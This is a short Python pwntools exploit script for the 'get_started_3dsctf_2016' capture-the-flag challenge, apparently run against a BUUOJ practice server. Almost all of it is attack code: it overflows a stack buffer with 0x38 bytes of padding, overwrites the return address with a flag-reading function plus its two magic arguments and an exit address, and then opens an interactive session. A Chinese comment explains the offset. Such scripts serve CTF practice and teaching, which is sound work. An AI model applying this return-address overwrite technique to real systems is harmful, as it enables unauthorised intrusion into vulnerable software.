from pwn import*
elf=ELF('./get_started_3dsctf_2016')
#p=process('./get_started_3dsctf_2016')
p=remote('node4.buuoj.cn',28186)
flag=0x80489a0
exit=0x804e6a0
payload=b'a'*(0x38)+p32(flag)+p32(exit)+p32(0x308CD64F)+p32(0x195719D1)
# 这里有个细节，main中汇编代码没有push ebp，
# 所以v4变量处写入0x38后就是返回地址
p.sendline(payload)
p.interactive()